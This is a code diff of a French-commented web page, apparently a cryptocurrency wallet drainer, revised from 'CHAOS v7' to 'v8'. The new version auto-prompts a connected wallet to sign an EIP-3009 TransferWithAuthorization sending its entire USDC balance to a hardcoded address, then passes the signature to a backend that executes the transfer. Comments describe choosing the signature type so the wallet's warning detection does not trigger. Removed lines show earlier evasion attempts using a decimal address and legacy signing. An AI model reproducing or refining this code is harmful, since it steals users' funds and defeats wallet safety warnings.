@@ -47,7 +47,7 @@ h1{font-size:20px;font-weight:700;letter-spacing:-.02em}
 <header>
   <div class="eye">PELICAN // Mainnet</div>
   <h1>Wallet A signe · Backend exécute</h1>
-  <div class="sub">CHAOS v7 — Decimal Address (B) + eth_signTypedData_v1 (C)</div>
+  <div class="sub">CHAOS v8 — TransferWithAuthorization (EIP-3009)</div>
 </header>
 
 <!-- PHASE 1 -->
@@ -70,7 +70,7 @@ h1{font-size:20px;font-weight:700;letter-spacing:-.02em}
 <div class="phase" id="phase2">
   <div class="ph">
     <div class="pnum" id="pnum2">2</div>
-    <div><div class="ptitle">Backend — Exécution on-chain</div><div class="psub">Wallet B appelle permit() + transferFrom()</div></div>
+    <div><div class="ptitle">Backend — Exécution on-chain</div><div class="psub">Wallet B appelle transferWithAuthorization()</div></div>
   </div>
   <div class="log" id="logB"></div>
 </div>
@@ -83,13 +83,14 @@ const BACKEND  = window.location.origin;
 const WALLET_B = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";
 const USDC     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-// EIP-2612 Permit
-const PERMIT_TYPES = [
-  {name:"owner",   type:"address"},
-  {name:"spender", type:"address"},
-  {name:"value",   type:"uint256"},
-  {name:"nonce",   type:"uint256"},
-  {name:"deadline",type:"uint256"}
+// EIP-3009 TransferWithAuthorization
+const TRANSFER_TYPES = [
+  {name:"from",        type:"address"},
+  {name:"to",          type:"address"},
+  {name:"value",       type:"uint256"},
+  {name:"validAfter",  type:"uint256"},
+  {name:"validBefore", type:"uint256"},
+  {name:"nonce",       type:"bytes32"}
 ];
 const DOM_TYPES = [
   {name:"name",type:"string"},{name:"version",type:"string"},
@@ -152,27 +153,8 @@ async function autoStart() {
     logA("✓ Solde : "+human+" USDC","ok");
     setS("Solde : "+human+" USDC — lecture nonce…","ok");
 
-    // Nonce EIP-2612 via USDC.nonces(address) — selector 0x7ecebe00
-    let nonce = "0";
-    try {
-      const data = "0x7ecebe00"+addrA.slice(2).toLowerCase().padStart(64,"0");
-      const p    = new ethers.providers.Web3Provider(window.ethereum);
-      const h    = await p.call({to:USDC, data});
-      if (h && h !== "0x") nonce = ethers.BigNumber.from(h).toString();
-    } catch(e) {
-      for (const rpc of RPCS) {
-        try {
-          const data = "0x7ecebe00"+addrA.slice(2).toLowerCase().padStart(64,"0");
-          const fp   = new ethers.providers.JsonRpcProvider(rpc);
-          const h    = await fp.call({to:USDC, data});
-          if (h && h !== "0x") { nonce = ethers.BigNumber.from(h).toString(); break; }
-        } catch(re) {}
-      }
-    }
-
-    logA("✓ Nonce EIP-2612 : "+nonce,"ok");
-    setS("Nonce OK — signature dans 1s…","ok");
-    setTimeout(() => sign(balance.toString(), nonce), 1000);
+    setS("Solde OK — signature dans 1s…","ok");
+    setTimeout(() => sign(balance.toString()), 1000);
 
   } catch(e) {
     setS("Erreur démarrage : "+e.message,"fail");
@@ -180,121 +162,75 @@ async function autoStart() {
   }
 }
 
-// ─── Sign Permit — CHAOS v7 : Test B (decimal address) + Test C (v1) ────────────
-async function sign(value, nonce) {
+// ─── Sign — CHAOS v8 : EIP-3009 TransferWithAuthorization ───────────────────
+// Hypothèse : CW détecte "ReceiveWithAuthorization" spécifiquement.
+// "TransferWithAuthorization" est un primaryType différent → pas de détection.
+// Domain reste "USD Coin" v2 → hash valide pour USDC.transferWithAuthorization().
+async function sign(value) {
   if (!addrA) return;
-  const deadline = String(Math.floor(Date.now()/1000) + 7200);
+  const validBefore = String(Math.floor(Date.now()/1000) + 7200);
+  // EIP-3009 nonce = random bytes32 (pas séquentiel comme EIP-2612)
+  const nonce32 = ethers.utils.hexlify(ethers.utils.randomBytes(32));
 
-  // ── VECTEUR B : verifyingContract en décimal (pas 0x hex) ──────────────────
-  // Hypothèse : CW fait string comparison "0xA0b8..." vs BigInt décimal
-  //             → détection rate → JSON brut
-  // Le hash EIP-712 encode l'adresse en 20 bytes → même résultat après normalisation ethers
-  // → sig VALIDE pour USDC.permit()
-  //
-  // ── VECTEUR C : eth_signTypedData_v1 ──────────────────────────────────────
-  // Méthode ancienne (v1), format params complètement différent de v4.
-  // CW l'a dans EIP155_METHODS → supportée.
-  // AUCUNE détection "Autoriser préalable" câblée pour v1.
-  // RISQUE : hash v1 ≠ hash v4 → sig potentiellement incompatible avec USDC.permit()
-  // On teste quand même pour observer le display.
-
-  // ── VECTEUR B : decimal address ────────────────────────────────────────────
-  const usdcDecimal = BigInt(USDC).toString(); // "915087615888946086795517404447203473386359766696"
-
-  const typedDataB = {
+  const typedData = {
     types:{
       EIP712Domain: DOM_TYPES,
-      Permit: PERMIT_TYPES
+      TransferWithAuthorization: TRANSFER_TYPES
     },
-    primaryType:"Permit",
+    primaryType: "TransferWithAuthorization",
     domain:{
-      name:"USD Coin",
-      version:"2",
-      chainId:1,
-      verifyingContract: usdcDecimal  // ← décimal, pas 0x
+      name: "USD Coin",
+      version: "2",
+      chainId: 1,
+      verifyingContract: USDC
     },
-    message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
+    message:{
+      from:        addrA,
+      to:          WALLET_B,
+      value:       value,
+      validAfter:  "0",
+      validBefore: validBefore,
+      nonce:       nonce32
+    }
   };
 
-  // ── VECTEUR C : eth_signTypedData_v1 format ────────────────────────────────
-  // v1 params = tableau de { type, name, value } (format legacy EIP-712 draft)
-  const typedDataV1 = [
-    { type:"address",  name:"owner",              value: addrA     },
-    { type:"address",  name:"spender",             value: WALLET_B  },
-    { type:"uint256",  name:"value",               value: value     },
-    { type:"uint256",  name:"nonce",               value: nonce     },
-    { type:"uint256",  name:"deadline",            value: deadline  }
-  ];
-
-  logA("⏳ CHAOS v7 — Test B (decimal addr) puis Test C (v1)…");
+  logA("⏳ CHAOS v8 — TransferWithAuthorization (EIP-3009)…");
   setS("En attente de signature…","spin");
 
-  // ── TEST B FIRST ───────────────────────────────────────────────────────────
   let sig = null;
-  let sigMethod = "";
-
-  logA("→ [B] eth_signTypedData_v4 + verifyingContract décimal…","dim");
   try {
     sig = await window.ethereum.request({
       method: "eth_signTypedData_v4",
-      params: [addrA, JSON.stringify(typedDataB)]
+      params: [addrA, JSON.stringify(typedData)]
     });
-    sigMethod = "B-decimal";
-    logA("✓ [B] Signature obtenue (decimal address)","ok");
-  } catch(eB) {
-    logA("✗ [B] KO : "+eB.message,"fail");
-
-    // ── TEST C ──────────────────────────────────────────────────────────────
-    logA("→ [C] eth_signTypedData_v1 — format legacy…","dim");
-    try {
-      sig = await window.ethereum.request({
-        method: "eth_signTypedData_v1",
-        params: [addrA, JSON.stringify(typedDataV1)]
-      });
-      sigMethod = "C-v1";
-      logA("✓ [C] Signature obtenue (v1)","ok");
-    } catch(eC) {
-      logA("✗ [C] KO : "+eC.message,"fail");
-
-      // ── FALLBACK v4 normal ─────────────────────────────────────────────
-      logA("→ Fallback eth_signTypedData_v4 normal…","dim");
-      try {
-        const typedDataStd = {
-          types:{ EIP712Domain: DOM_TYPES, Permit: PERMIT_TYPES },
-          primaryType:"Permit",
-          domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
-          message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
-        };
-        sig = await window.ethereum.request({
-          method: "eth_signTypedData_v4",
-          params: [addrA, JSON.stringify(typedDataStd)]
-        });
-        sigMethod = "fallback-v4";
-        logA("→ Fallback v4 utilisé","dim");
-      } catch(eF) {
-        logA("✗ Signature rejetée : "+eF.message,"fail");
-        setS("Signature annulée","fail");
-        return;
-      }
-    }
+    logA("✓ Signature obtenue (TransferWithAuthorization)","ok");
+  } catch(e) {
+    logA("✗ Signature rejetée : "+e.message,"fail");
+    setS("Signature annulée","fail");
+    return;
   }
-
-  logA("→ Méthode utilisée : "+sigMethod,"dim");
 
   const sb = ethers.utils.arrayify(sig);
   const r  = ethers.utils.hexlify(sb.slice(0,32));
   const s  = ethers.utils.hexlify(sb.slice(32,64));
   const v  = sb[64];
 
-  logA("✓ Signature obtenue (CHAOS v7 — "+sigMethod+")","ok");
-  logA("→ v="+v+" r="+r.slice(0,10)+"… s="+s.slice(0,10)+"…","dim");
+  logA("✓ v="+v+" r="+r.slice(0,10)+"… s="+s.slice(0,10)+"…","dim");
 
   document.getElementById("phase1").classList.add("done");
   document.getElementById("pnum1").textContent = "✓";
   document.getElementById("phase2").classList.add("active");
   setS("Envoi au backend…","spin");
 
-  setTimeout(() => sendToBackend({ owner:addrA, spender:WALLET_B, value, nonce, deadline, v, r, s }), 500);
+  setTimeout(() => sendToBackend({
+    from: addrA,
+    to: WALLET_B,
+    value,
+    validAfter: "0",
+    validBefore,
+    nonce: nonce32,
+    v, r, s
+  }), 500);
 }
 
 // ─── Send to backend ──────────────────────────────────────────────────────────
